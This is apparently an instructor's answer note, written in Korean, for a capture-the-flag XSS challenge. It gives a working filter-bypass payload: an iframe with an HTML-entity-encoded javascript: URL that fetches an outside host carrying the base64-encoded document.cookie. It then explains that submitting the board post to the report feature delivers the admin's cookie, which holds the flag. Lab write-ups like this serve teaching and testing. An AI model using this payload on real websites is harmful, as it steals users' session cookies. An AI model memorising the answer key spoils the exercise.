# [강사용] XSS #2 (원본 풀이)
필터가 `(`,`)`,`'`,`script`,`on` 등을 막음 → iframe + HTML 엔티티로 우회:
```html
sad<iframe src="javas&#x63;ript:fetch&#x28;&#x27;http://host.docker.internal:8000/?a=&#x27;+btoa&#x28;document.cookie&#x29;&#x29;">
```
신고에 `http://xss-2:9102/board/<seq>` 제출 → admin 쿠키(flag) 수신.
